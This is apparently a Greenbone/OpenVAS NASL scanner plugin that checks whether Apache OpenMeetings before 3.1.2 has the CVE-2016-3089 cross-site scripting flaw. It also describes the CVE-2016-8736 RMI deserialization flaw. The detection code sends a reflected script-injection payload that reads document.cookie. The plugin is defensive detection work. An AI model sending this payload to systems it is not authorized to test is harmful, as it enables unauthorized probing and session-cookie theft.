CPE = "cpe:/a:apache:openmeetings";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.808658" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2016-3089", "CVE-2016-8736" );
	script_bugtraq_id( 92442, 94145 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2016-08-23 15:09:03 +0530 (Tue, 23 Aug 2016)" );
	script_name( "Apache OpenMeetings < 3.1.2 Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_apache_openmeetings_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Apache/Openmeetings/Installed" );
	script_xref( name: "URL", value: "http://openmeetings.apache.org/security.html" );
	script_xref( name: "URL", value: "https://www.apache.org/dist/openmeetings/3.1.2/CHANGELOG" );
	script_tag( name: "summary", value: "The host is installed with Apache
  OpenMeetings and is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and
  check whether it is possible to read a cookie or not." );
	script_tag( name: "insight", value: "The flaw exists due to:

  - an improper sanitization of input to 'swf'query parameter in swf panel (CVE-2016-3089)

  - a remote code execution vulnerability via RMI deserialization attack (CVE-2016-8736)." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute:

  - arbitrary script code in a user's browser session within
  the trust relationship between their browser and the server.

  - remote commands via RMI attacks against the server." );
	script_tag( name: "affected", value: "Apache OpenMeetings prior to 3.1.2" );
	script_tag( name: "solution", value: "Upgrade to Apache OpenMeetings version 3.1.2." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!openPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: openPort )){
	exit( 0 );
}
url = dir + "/swf?swf=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E";
if(http_vuln_check( port: openPort, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>", extra_check: make_list( ">OpenMeetings<",
	 ">Timezone<" ) )){
	report = http_report_vuln_url( port: openPort, url: url );
	security_message( port: openPort, data: report );
	exit( 0 );
}
exit( 99 );

